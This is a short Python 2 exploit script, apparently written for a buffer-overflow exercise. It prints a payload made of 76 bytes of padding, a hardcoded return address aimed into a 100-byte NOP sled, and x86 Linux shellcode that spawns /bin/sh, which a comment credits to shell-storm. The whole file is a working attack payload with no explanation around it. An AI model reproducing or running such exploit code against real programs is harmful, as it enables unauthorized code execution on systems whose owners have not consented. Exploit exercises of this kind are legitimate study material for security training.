import struct

padding = "A"*76
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopslide = "\x90"*100
eip = struct.pack("I",0xbffff7f8+8)     # this should be somwhere nopslide

#shellcode is taken from shellstorm: http://shell-storm.org/shellcode/files/shellcode-811.php

print padding+eip+nopslide+shellcode
